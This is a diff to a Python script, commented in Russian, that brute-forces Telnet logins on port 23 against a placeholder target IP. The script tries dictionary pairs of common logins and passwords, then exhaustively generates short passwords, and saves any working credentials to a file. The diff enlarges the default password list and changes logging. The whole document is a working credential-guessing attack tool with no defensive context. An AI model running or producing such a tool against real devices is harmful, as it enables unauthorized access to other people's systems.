@@ -4,20 +4,16 @@ import itertools
 import string
 import os
 
-host = "192.168.1.1"  # Заменить на цель
+host = "192.168.1.1"  # Замените на IP цели
 port = 23
 
 max_threads = 30
 found = False
 lock = threading.Lock()
 
-# Популярные логины (если файл не найден)
 default_logins = ["admin", "root", "user", "guest", "test"]
+default_passwords = ["admin", "password", "123456", "12345678", "1234", "12345", "123456789", "root", "guest", "test", "123123", "abc123", "qwerty", "letmein", "monkey", "dragon", "111111", "passw0rd", "password1", "123qwe", "654321", "superuser"]
 
-# Популярные пароли (если файл не найден)
-default_passwords = ["admin", "password", "123456", "root", "1234", "guest", "test"]
-
-# Набор символов для перебора
 charset = string.ascii_letters + string.digits
 min_len = 1
 max_len = 4
@@ -72,12 +68,12 @@ def try_login(username, password):
                         f.write(f"{username}:{password}\n")
         sock.close()
     except Exception as e:
-        pass
+        print(f"Ошибка: {e}")
 
 def worker_queue(q):
     while not q.empty() and not found:
         username, password = q.get()
-        print(f"Пробуем: {username}:{password}", end='\r')
+        print(f"Пробуем: {username}:{password}")
         try_login(username, password)
         q.task_done()
 
@@ -102,12 +98,12 @@ if __name__ == "__main__":
 
     q = Queue()
 
-    # Сначала словарные пары (логин x пароль из словарей)
+    # Сначала словарные пары (логин x пароль)
     for username in logins:
         for password in passwords:
             q.put((username, password))
 
-    # Если не нашли, добавим полный перебор паролей для каждого логина
+    # Потом полный перебор паролей для каждого логина
     for username in logins:
         for password in generate_passwords(charset, min_len, max_len):
             q.put((username, password))
